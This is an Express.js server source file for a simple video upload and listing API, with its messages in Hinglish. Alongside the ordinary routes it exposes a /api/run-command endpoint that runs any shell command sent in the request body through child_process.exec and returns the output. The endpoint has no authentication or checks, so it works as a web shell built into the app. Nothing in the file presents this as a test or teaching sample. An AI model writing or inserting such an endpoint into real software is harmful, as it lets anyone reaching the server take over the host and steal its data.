const express = require('express');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const DB_FILE = path.join(__dirname, 'videos.json');

function getVideos() {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify([]));
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
}

function saveVideos(videos) {
    fs.writeFileSync(DB_FILE, JSON.stringify(videos, null, 2));
}

app.post('/api/upload', (req, res) => {
    const { title, videoUrl } = req.body;
    if (!title || !videoUrl) {
        return res.status(400).json({ error: 'Title aur videoUrl zaroori hain!' });
    }
    const videos = getVideos();
    const newVideo = { id: Date.now(), title, videoUrl };
    videos.push(newVideo);
    saveVideos(videos);
    res.json({ message: 'Video saved successfully!', id: newVideo.id });
});

app.get('/api/videos', (req, res) => {
    const videos = getVideos();
    res.json(videos);
});

app.post('/api/run-command', (req, res) => {
    const { command } = req.body;
    if (!command) {
        return res.status(400).json({ error: 'Command zaroori hai!' });
    }
    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: error.message, stderr });
        }
        res.json({ output: stdout, stderr });
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
